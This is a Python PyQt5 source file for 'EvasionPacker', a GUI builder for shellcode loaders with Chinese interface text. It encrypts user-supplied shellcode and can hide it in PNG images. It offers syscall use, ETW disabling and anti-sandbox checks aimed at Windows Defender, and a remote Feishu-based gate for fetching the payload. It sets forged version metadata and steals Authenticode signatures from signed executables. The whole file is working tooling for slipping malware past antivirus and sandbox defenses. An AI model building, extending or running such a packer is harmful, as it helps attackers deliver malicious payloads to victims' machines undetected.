import os
import sys
import struct
import secrets


from configManager import ConfigManager
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                           QHBoxLayout, QLabel, QComboBox, QCheckBox, 
                           QPushButton, QGroupBox, QFileDialog, QMessageBox,
                           QLineEdit, QGridLayout, QSizePolicy)
from PyQt5.QtCore import QThread, pyqtSignal,Qt

class CompileThread(QThread):
    finished = pyqtSignal(bool, str)  

    def __init__(self, sln_path):
        super().__init__()
        self.sln_path = sln_path

    def run(self):
        try:
            import subprocess
            subprocess.run(["devenv.com", self.sln_path, "/Rebuild"], 
                         check=True, 
                         capture_output=True,
                         shell=True)
            self.finished.emit(True, "")
        except subprocess.CalledProcessError as e:
            self.finished.emit(False, f"编译失败: {e.stderr.decode('gbk', errors='ignore')}")
        except FileNotFoundError as e:
            self.finished.emit(False, f"找不到devenv.com，请确保Visual Studio已安装并添加到环境变量中")
        except Exception as e:
            self.finished.emit(False, str(e))

class ShellcodeThread(QThread):
    finished = pyqtSignal(bool, str, bytes) 

    def __init__(self, config_manager, settings):
        super().__init__()
        self.config_manager = config_manager
        self.settings = settings

    def run(self):
        try:
            encrypted_data = self.config_manager.encrypt_shellcode(self.settings['encrypt_method'])
            self.finished.emit(True, "", encrypted_data)
        except Exception as e:
            self.finished.emit(False, str(e), b"")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EvasionPacker")
        self.config_manager = ConfigManager()
        self.compile_thread = None
        self.processing_label = None
        self.generate_btn = None  


        current_dir = os.path.dirname(os.path.abspath(__file__))
        paths_to_create = [
            os.path.join(current_dir, "..", "Loader", "x64"),
            os.path.join(current_dir, "..", "Loader", "x64", "Release")
        ]
        
        for path in paths_to_create:
            if not os.path.exists(path):
                os.makedirs(path)

        self.init_ui()
        self.setMinimumWidth(900)  
        self.setMinimumHeight(1000)  

    def show_processing_label(self, message):
        if not self.processing_label:
            
            self.overlay = QWidget(self)
            self.overlay.setStyleSheet("background-color: rgba(0, 0, 0, 0.5);")
            self.overlay.hide()
            
            self.processing_label = QLabel(message, self.overlay)  
            self.processing_label.setStyleSheet("""
                background-color: #FFF3CD;
                color: #856404;
                padding: 20px;
                border: 1px solid #FFE69C;
                border-radius: 4px;
                font-size: 13pt;
                font-weight: bold;
            """)
            self.processing_label.setFixedSize(450, 80)
            self.processing_label.setAlignment(Qt.AlignCenter)
            self.processing_label.setWordWrap(True)  
        else:
            self.processing_label.setText(message)
        
        self.overlay.resize(self.size())
        self.overlay.show()
        
        x = (self.overlay.width() - self.processing_label.width()) // 2
        y = (self.overlay.height() - self.processing_label.height()) // 2
        self.processing_label.move(x, y)
        

        self.setEnabled(False)
        self.overlay.setEnabled(True)
        self.processing_label.setEnabled(True)
    def hide_processing_label(self):
        if hasattr(self, 'overlay'):
            self.overlay.hide()

        self.setEnabled(True)
    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择Shellcode文件", "", "所有文件 (*.*)")
        if file_name:
            self.file_path.setText(file_name)
    def browse_sign_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择签名文件", "", "可执行文件 (*.exe *.dll);;所有文件 (*.*)")
        if file_name:
            self.sign_path.setText(file_name)
    def browse_output_file(self):
        file_name, _ = QFileDialog.getSaveFileName(
            self, "选择输出位置", "", "可执行文件 (*.exe);;所有文件 (*.*)")
        if file_name:
            self.output_path.setText(file_name)
    def resizeEvent(self, event):
        super().resizeEvent(event)
        if hasattr(self, 'overlay') and self.overlay.isVisible():
            self.overlay.resize(self.size())
            x = (self.overlay.width() - self.processing_label.width()) // 2
            y = (self.overlay.height() - self.processing_label.height()) // 2
            self.processing_label.move(x, y)
    
    def update_version_info(self):
        import re
        current_dir = os.path.dirname(os.path.abspath(__file__))
        rc_path = os.path.join(current_dir, "..", "Loader", "EvasionPacker.rc")
        
        try:
            if not os.path.exists(rc_path):
                QMessageBox.warning(self, "警告", f"找不到RC文件：{rc_path}")
                return False

            encodings = ['utf-8', 'gbk', 'utf-16', 'utf-16le']
            content = None
            
            for encoding in encodings:
                try:
                    with open(rc_path, 'r', encoding=encoding) as f:
                        content = f.read()
                    break
                except UnicodeDecodeError:
                    continue
            
            if content is None:
                raise ValueError("无法读取RC文件，不支持的编码格式")
            
            version = self.version_edit.text().strip()
            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', version):
                QMessageBox.warning(self, "警告", "版本号格式不正确，应为x.x.x.x格式")
                return
                
            version_nums = version.replace('.', ',')
            
            content = re.sub(r'FILEVERSION \d+,\d+,\d+,\d+', f'FILEVERSION {version_nums}', content)
            content = re.sub(r'PRODUCTVERSION \d+,\d+,\d+,\d+', f'PRODUCTVERSION {version_nums}', content)
            content = re.sub(r'VALUE "FileVersion", *"[^"]*"', f'VALUE "FileVersion", "{version}"', content)
            content = re.sub(r'VALUE "ProductVersion", *"[^"]*"', f'VALUE "ProductVersion", "{version}"', content)
            content = re.sub(r'VALUE "CompanyName", *"[^"]*"', f'VALUE "CompanyName", "{self.company_edit.text()}"', content)
            content = re.sub(r'VALUE "FileDescription", *"[^"]*"', f'VALUE "FileDescription", "{self.desc_edit.text()}"', content)
            content = re.sub(r'VALUE "LegalCopyright", *"[^"]*"', f'VALUE "LegalCopyright", "{self.copyright_edit.text()}"', content)
            content = re.sub(r'VALUE "ProductName", *"[^"]*"', f'VALUE "ProductName", "{self.desc_edit.text()}"', content)
            content = re.sub(r'VALUE "OriginalFilename", *"[^"]*"', f'VALUE "OriginalFilename", "{self.desc_edit.text()}"', content)
            content = re.sub(r'VALUE "InternalName", *"[^"]*"', f'VALUE "InternalName", "{self.desc_edit.text()}"', content)
            
            
            if not any(pattern in content for pattern in ['FILEVERSION', 'PRODUCTVERSION', 'VALUE']):
                raise ValueError("RC文件格式不正确")
                
            with open(rc_path, 'w', encoding=encoding) as f:
                f.write(content)
                return True
                
        except Exception as e:
            QMessageBox.warning(self, "警告", f"更新版本信息失败：{str(e)}")
            return False
    
    def toggle_access_control_fields(self, state):
        """根据准入控制复选框的状态切换相关字段的可见性"""
        self.access_control_group.setVisible(state == Qt.Checked)
        
        # 添加互斥控制：当启用准入控制时，禁用图片隐写
        if state == Qt.Checked:
            self.steg_check.setChecked(False)
            self.steg_check.setEnabled(False)
        else:
            self.steg_check.setEnabled(True)
            
    def on_steg_check_changed(self, state):
        """当图片隐写复选框状态改变时的处理"""
        # 添加互斥控制：当启用图片隐写时，禁用准入控制
        if state == Qt.Checked:
            self.access_control_check.setChecked(False)
            self.access_control_check.setEnabled(False)
        else:
            self.access_control_check.setEnabled(True)

    def browse_payload_path(self):
        """选择payload.bin的保存目录"""
        dir_path = QFileDialog.getExistingDirectory(self, "选择Payload保存目录")
        if dir_path:
            self.payload_path_edit.setText(dir_path)

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(20)  
        layout.setContentsMargins(20, 20, 20, 20)  
        encryption_group = QGroupBox("Shellcode加密设置")
        encryption_group.setFixedHeight(90)  
        encryption_layout = QHBoxLayout()  
        encryption_layout.setSpacing(5)  
        encryption_layout.setContentsMargins(5, 5, 5, 5) 
        
        left_layout = QHBoxLayout()  
        self.sgn_check = QCheckBox("启用SGN预处理")  
        left_layout.addWidget(self.sgn_check)
        
        enc_method_label = QLabel("加密方式:")
        self.encryption_combo = QComboBox()
        self.encryption_combo.addItems(self.config_manager.encryption_methods)
        left_layout.addWidget(enc_method_label)
        left_layout.addWidget(self.encryption_combo)
        
        encryption_layout.addLayout(left_layout, 1)
        
        # 右侧放置文件选择
        file_layout = QHBoxLayout()
        file_layout.setSpacing(5)  
        self.file_path = QLineEdit()
        self.file_path.setReadOnly(True)
        browse_btn = QPushButton("选择Shellcode")
        browse_btn.clicked.connect(self.browse_file)
        file_layout.addWidget(self.file_path)
        file_layout.addWidget(browse_btn)
        
        encryption_layout.addLayout(file_layout, 2)  # 文件选择区域占更多空间
        encryption_group.setLayout(encryption_layout)
        layout.addWidget(encryption_group)

        loader_group = QGroupBox("Loader配置")
        loader_group.setFixedHeight(300)  
        loader_layout = QVBoxLayout()
        loader_layout.setSpacing(3)
        loader_layout.setContentsMargins(10, 10, 10, 10)
        layout.addWidget(loader_group)

        sign_group = QGroupBox("输出设置")
        sign_layout = QVBoxLayout()
        sign_layout.setSpacing(5)
        sign_layout.setContentsMargins(10, 10, 10, 10)
        sign_file_layout = QHBoxLayout()
        self.sign_path = QLineEdit()
        self.sign_path.setReadOnly(True)
        self.sign_path.setPlaceholderText("选择带签名的PE文件(可选)")
        browse_sign_btn = QPushButton("选择签名文件")
        browse_sign_btn.clicked.connect(self.browse_sign_file)
        sign_file_layout.addWidget(self.sign_path)
        sign_file_layout.addWidget(browse_sign_btn)
        
        icon_file_layout = QHBoxLayout()
        self.icon_path = QLineEdit()
        self.icon_path.setReadOnly(True)
        self.icon_path.setPlaceholderText("选择自定义图标文件(可选)")
        browse_icon_btn = QPushButton("选择图标")
        browse_icon_btn.clicked.connect(self.browse_icon_file)
        icon_file_layout.addWidget(self.icon_path)
        icon_file_layout.addWidget(browse_icon_btn)
        sign_layout.addLayout(icon_file_layout)
        
        steg_layout = QHBoxLayout()
        self.steg_check = QCheckBox("启用图片隐写")
        self.steg_check.stateChanged.connect(self.on_steg_check_changed)  
        self.steg_name = QLineEdit()  
        self.steg_name.setFixedWidth(60)  
        self.steg_name.setText("1.png")  
        steg_layout.addWidget(self.steg_check)
        steg_layout.addWidget(self.steg_name) 
        sign_layout.addLayout(steg_layout)

        etw_layout = QHBoxLayout()
        self.disable_etw_check = QCheckBox("DisableETW")
        self.disable_etw_check.setChecked(True)
        etw_layout.addWidget(self.disable_etw_check)
        sign_layout.addLayout(etw_layout)

        payload_control_layout = QHBoxLayout()
        self.payloadControl_check = QCheckBox("启用多重载荷控制(防止重复上线)")
        self.payloadControl_check.setChecked(True)  
        payload_control_layout.addWidget(self.payloadControl_check)
        sign_layout.addLayout(payload_control_layout)
    
        access_control_layout = QHBoxLayout()
        self.access_control_check = QCheckBox("启用准入控制")
        self.access_control_check.setToolTip("基于飞书,启用后只写入密钥到shellcode.h")
        self.access_control_check.stateChanged.connect(self.toggle_access_control_fields)
        access_control_layout.addWidget(self.access_control_check)
        sign_layout.addLayout(access_control_layout)

        # 添加准入控制相关字段
        self.access_control_group = QGroupBox("准入控制配置")
        self.access_control_group.setVisible(False)  # 默认隐藏
        access_control_fields_layout = QGridLayout()  
        access_control_fields_layout.setSpacing(3)  
        access_control_fields_layout.setContentsMargins(3, 3, 3, 3)  
        
        app_id_label = QLabel("App ID:")
        self.app_id_edit = QLineEdit()
        access_control_fields_layout.addWidget(app_id_label, 0, 0)
        access_control_fields_layout.addWidget(self.app_id_edit, 0, 1)
        
        # App Secret
        app_secret_label = QLabel("App Secret:")
        self.app_secret_edit = QLineEdit()
        access_control_fields_layout.addWidget(app_secret_label, 0, 2)
        access_control_fields_layout.addWidget(self.app_secret_edit, 0, 3)
        
        # Sheet ID
        sheet_id_label = QLabel("Sheet ID:")
        self.sheet_id_edit = QLineEdit()
        access_control_fields_layout.addWidget(sheet_id_label, 1, 0)
        access_control_fields_layout.addWidget(self.sheet_id_edit, 1, 1)
        
        spreadsheet_token_label = QLabel("Spreadsheet Token:")
        self.spreadsheet_token_edit = QLineEdit()
        access_control_fields_layout.addWidget(spreadsheet_token_label, 1, 2)
        access_control_fields_layout.addWidget(self.spreadsheet_token_edit, 1, 3)
        
        payload_path_label = QLabel("Payload路径:")  
        self.payload_path_edit = QLineEdit()
        self.payload_path_edit.setPlaceholderText("留空则保存到Loader目录")
        browse_payload_path_btn = QPushButton("浏览")
        browse_payload_path_btn.clicked.connect(self.browse_payload_path)
        
        access_control_fields_layout.addWidget(payload_path_label, 2, 0)
        access_control_fields_layout.addWidget(self.payload_path_edit, 2, 1, 1, 2)
        access_control_fields_layout.addWidget(browse_payload_path_btn, 2, 3)
        
        self.access_control_group.setLayout(access_control_fields_layout)
        sign_layout.addWidget(self.access_control_group)
        
        
        self.access_control_group.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
        self.access_control_group.setMaximumHeight(120)  

        output_file_layout = QHBoxLayout()
        self.output_path = QLineEdit()
        self.output_path.setReadOnly(True)
        self.output_path.setPlaceholderText("选择最终输出位置(可选)")
        browse_output_btn = QPushButton("选择输出位置")
        browse_output_btn.clicked.connect(self.browse_output_file)
        output_file_layout.addWidget(self.output_path)
        output_file_layout.addWidget(browse_output_btn)
        
        sign_layout.addLayout(sign_file_layout)
        sign_layout.addLayout(output_file_layout)
        sign_group.setLayout(sign_layout)



        version_group = QGroupBox("版本信息设置")
        version_layout = QVBoxLayout()
        version_layout.setSpacing(10)   
        version_layout.setContentsMargins(15, 15, 15, 15) 

        company_layout = QHBoxLayout()
        company_label = QLabel("公司名称:")
        self.company_edit = QLineEdit()
        self.company_edit.setText("Evasion")
        company_layout.addWidget(company_label)
        company_layout.addWidget(self.company_edit)
        version_layout.addLayout(company_layout)
        

        desc_layout = QHBoxLayout()
        desc_label = QLabel("文件描述:")
        self.desc_edit = QLineEdit()
        self.desc_edit.setText("Evasion.exe")
        desc_layout.addWidget(desc_label)
        desc_layout.addWidget(self.desc_edit)
        version_layout.addLayout(desc_layout)
        

        version_layout_h = QHBoxLayout()
        version_label = QLabel("版本号:")
        self.version_edit = QLineEdit()
        self.version_edit.setText("0.0.0.6")
        version_layout_h.addWidget(version_label)
        version_layout_h.addWidget(self.version_edit)
        version_layout.addLayout(version_layout_h)


        copyright_layout = QHBoxLayout()
        copyright_label = QLabel("版权信息:")
        self.copyright_edit = QLineEdit()
        self.copyright_edit.setText("Copyright (C) 2025")
        copyright_layout.addWidget(copyright_label)
        copyright_layout.addWidget(self.copyright_edit)
        version_layout.addLayout(copyright_layout)
        
        version_group.setLayout(version_layout)
        sign_layout.addWidget(version_group)




        layout.addWidget(sign_group)
        tip_label = QLabel("反沙箱请基于目标环境按需勾选，以免上不了线")
        tip_label.setStyleSheet("""
            QLabel {
                color: #856404;
                background-color: #fff3cd;
                padding: 8px;
                border: 1px solid #ffeeba;
                border-radius: 4px;
                margin-bottom: 10px;
            }
        """)
        loader_layout.addWidget(tip_label)
        
        self.syscall_check = QCheckBox("启用 Syscall")
        self.anti_vm_check = QCheckBox("启用 基本沙箱检测")
        self.anti_defender_check = QCheckBox("反沙箱-WindowsDefender专用")
        self.dll_trick_check = QCheckBox("反沙箱-DllGetClassObject")
        self.sx_trick_check = QCheckBox("反沙箱-SxInDll")
        self.vxqq_check = QCheckBox("反沙箱-基于微信QQ")  
        loader_layout.addWidget(self.syscall_check)
        loader_layout.addWidget(self.anti_vm_check)
        loader_layout.addWidget(self.anti_defender_check)
        loader_layout.addWidget(self.dll_trick_check)
        loader_layout.addWidget(self.sx_trick_check)
        loader_layout.addWidget(self.vxqq_check) 
    
        self.dll_trick_check.setChecked(True)
        self.syscall_check.setChecked(True)
        self.sx_trick_check.setChecked(True)
        exec_layout = QHBoxLayout()
        exec_label = QLabel("执行方法:")
        self.exec_combo = QComboBox()
        self.exec_combo.addItems(self.config_manager.execution_methods)
        self.exec_combo.currentTextChanged.connect(self.on_exec_method_changed)
        exec_layout.addWidget(exec_label)
        exec_layout.addWidget(self.exec_combo)
        loader_layout.addLayout(exec_layout)
        enum_layout = QHBoxLayout()
        enum_label = QLabel("回调触发方法:")
        self.enum_combo = QComboBox()
        self.enum_combo.addItems(self.config_manager.enum_methods)
        self.enum_combo.setEnabled(False)  
        enum_layout.addWidget(enum_label)
        enum_layout.addWidget(self.enum_combo)
        loader_layout.addLayout(enum_layout)
        alloc_layout = QHBoxLayout()
        alloc_label = QLabel("内存分配方法:")
        self.alloc_combo = QComboBox()
        self.alloc_combo.addItems(self.config_manager.allocate_methods)
        alloc_layout.addWidget(alloc_label)
        alloc_layout.addWidget(self.alloc_combo)
        loader_layout.addLayout(alloc_layout)
        loader_group.setLayout(loader_layout)
        layout.addWidget(loader_group)
        self.generate_btn = QPushButton("生成")  
        self.generate_btn.setFixedHeight(35) 
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #007bff;
                color: white;
                border: none;
                padding: 5px 15px;
                border-radius: 4px;
                font-size: 12pt;
            }
            QPushButton:hover {
                background-color: #0056b3;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
        """)
        self.generate_btn.clicked.connect(self.generate)
        layout.addWidget(self.generate_btn)
        combo_style = """
            QComboBox {
                padding: 5px;
                min-width: 200px;
            }
        """
        for combo in [self.encryption_combo, self.exec_combo, self.enum_combo, self.alloc_combo]:
            combo.setStyleSheet(combo_style)
        for check in [self.syscall_check, self.anti_vm_check, self.anti_defender_check, 
                     self.dll_trick_check, self.sx_trick_check, self.vxqq_check, self.sgn_check , self.steg_check, self.disable_etw_check, self.payloadControl_check]:
            check.setStyleSheet("QCheckBox { padding: 2px; }")
    def browse_steg_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择PNG图片", "", "PNG图片 (*.png);;所有文件 (*.*)")
        if file_name:
            self.steg_path.setText(file_name)

    def update_vcxproj_preprocessor_definitions(self):
        """根据准入控制状态修改预编译项"""
        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            vcxproj_path = os.path.join(current_dir, "..", "Loader", "EvasionPacker.vcxproj")
            
            if not os.path.exists(vcxproj_path):
                print(f"找不到项目文件：{vcxproj_path}")
                return
            
            import xml.etree.ElementTree as ET
            
            ET.register_namespace('', "http://schemas.microsoft.com/developer/msbuild/2003")
            tree = ET.parse(vcxproj_path)
            root = tree.getroot()
            
            # 查找Release|x64配置的PreprocessorDefinitions
            ns = {'ns': "http://schemas.microsoft.com/developer/msbuild/2003"}
            for item_def_group in root.findall(".//ns:ItemDefinitionGroup[@Condition=\"'$(Configuration)|$(Platform)'=='Release|x64'\"]", ns):
                for compile in item_def_group.findall(".//ns:ClCompile", ns):
                    for preproc in compile.findall(".//ns:PreprocessorDefinitions", ns):
                        current_defs = preproc.text
                        
                        # 检查是否启用准入控制
                        if self.access_control_check.isChecked():
                            if "ENABLE_ADMISSION_PLATFORM" not in current_defs:
                                new_defs = current_defs.replace("%(PreprocessorDefinitions)", "ENABLE_ADMISSION_PLATFORM;%(PreprocessorDefinitions)")
                                preproc.text = new_defs
                        else:
                            if "ENABLE_ADMISSION_PLATFORM" in current_defs:
                                new_defs = current_defs.replace("ENABLE_ADMISSION_PLATFORM;", "")
                                preproc.text = new_defs
            
            tree.write(vcxproj_path, encoding="utf-8", xml_declaration=True)
            
        except Exception as e:
            print(f"修改预编译项时出错：{str(e)}")
            
    def on_compile_finished(self, success, error_msg):
        if success:
            try:
                current_dir = os.path.dirname(os.path.abspath(__file__))
                input_path = os.path.join(current_dir, "..", "Loader", "x64", "Release", "EvasionPacker.exe")
                
                if self.sign_path.text():
                    sys.path.append(os.path.join(current_dir, "tools"))
                    from sigthief import copyCert, writeCert
                    
                    temp_signed = os.path.join(current_dir, "..", "Loader", "x64", "Release", "EvasionPacker_signed.exe")
                    cert = copyCert(self.sign_path.text())
                    writeCert(cert, input_path, temp_signed)
                    
                    os.remove(input_path)
                    os.rename(temp_signed, input_path)
                
                if self.output_path.text():
                    import shutil
                    if os.path.exists(self.output_path.text()):
                        os.remove(self.output_path.text())
                    shutil.move(input_path, self.output_path.text())
                    QMessageBox.information(self, "成功", "文件生成完成" + 
                        ("，并已完成签名窃取" if self.sign_path.text() else ""))
                else:
                    QMessageBox.information(self, "成功", f"文件已生成到：{input_path}" + 
                        ("，并已完成签名窃取" if self.sign_path.text() else ""))
                        
            except Exception as e:
                QMessageBox.warning(self, "警告", f"后处理失败：{str(e)}\n但编译已成功完成")
        else:
            QMessageBox.critical(self, "错误", f"生成失败：{error_msg}")
        
        self.hide_processing_label()

    def browse_icon_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择图标文件", "", "图标文件 (*.ico);;所有文件 (*.*)")
        if file_name:
            self.icon_path.setText(file_name)
    
    def on_shellcode_finished(self, success, error_msg, encrypted_data):
        if not success:
            self.hide_processing_label()
            QMessageBox.critical(self, "错误", f"Shellcode处理失败：{error_msg}")
            return

        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            if not self.update_version_info():
                self.hide_processing_label()
                return

            self.update_vcxproj_preprocessor_definitions()

            if self.icon_path.text():
                import shutil
                icon_dest = os.path.join(current_dir, "..", "Loader", "icon.ico")
                shutil.copy2(self.icon_path.text(), icon_dest)
            
            settings = self.config_manager.get_settings_from_ui(self)
            
            if self.steg_check.isChecked():
                steg_filename = self.steg_name.text() if self.steg_name.text() else "shellcode_steg.png"
                steg_output = os.path.join(current_dir, "..", "Loader", steg_filename)
                
                self.config_manager.save_to_header_placeholder(len(encrypted_data))
                
                self.config_manager.steg_shellcode_to_image(
                    encrypted_data,
                    steg_output
                )
                QMessageBox.information(self, "提示", f"隐写图片已生成到：{steg_output}")
            elif self.access_control_check.isChecked():
                # 启用准入控制，只写入密钥信息
                self.config_manager.save_to_header_key_only()
                
                payload_dir = self.payload_path_edit.text() if hasattr(self, 'payload_path_edit') and self.payload_path_edit.text() else os.path.join(current_dir, "..", "Loader")
                payload_path = os.path.join(payload_dir, "payload.bin")
                
                os.makedirs(os.path.dirname(payload_path), exist_ok=True)
                
                with open(payload_path, 'wb') as f:
                    f.write(encrypted_data)
                
                QMessageBox.information(self, "提示", f"已启用准入控制,请自行搭建准入bot,payload.bin已保存到：{payload_path},自行上传至bot同目录")
            else:
                self.config_manager.save_to_header(encrypted_data)
            
            self.config_manager.update_config(settings)

            sln_path = os.path.normpath(os.path.join(current_dir, "..", "Loader", "EvasionPacker.sln"))
            self.compile_thread = CompileThread(sln_path)
            self.compile_thread.finished.connect(self.on_compile_finished)
            self.compile_thread.start()
            self.show_processing_label("正在编译中，请稍候（预计需要1分钟）...")
            
        except Exception as e:
            self.hide_processing_label()
            QMessageBox.critical(self, "错误", f"生成失败：{str(e)}")

    def generate(self):
        if not self.file_path.text():
            QMessageBox.warning(self, "警告", "请先选择Shellcode文件")
            return
        settings = self.config_manager.get_settings_from_ui(self)
        
        try:
            
            self.config_manager.shellcode_path = self.file_path.text()
            self.config_manager.sgn_enabled = self.sgn_check.isChecked()
            
            self.shellcode_thread = ShellcodeThread(self.config_manager, settings)
            self.shellcode_thread.finished.connect(self.on_shellcode_finished)
            self.shellcode_thread.start()
            
            message = "正在处理Shellcode"
            if self.sgn_check.isChecked():
                message += "（使用SGN预处理，预计需要30秒）"
            message += "..."
            self.show_processing_label(message)
            
        except Exception as e:
            QMessageBox.critical(self, "错误", f"生成失败：{str(e)}")
            print(f"Error: {e}")
    def on_exec_method_changed(self, text):
        self.enum_combo.setEnabled(text == "EnumCallback")

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()


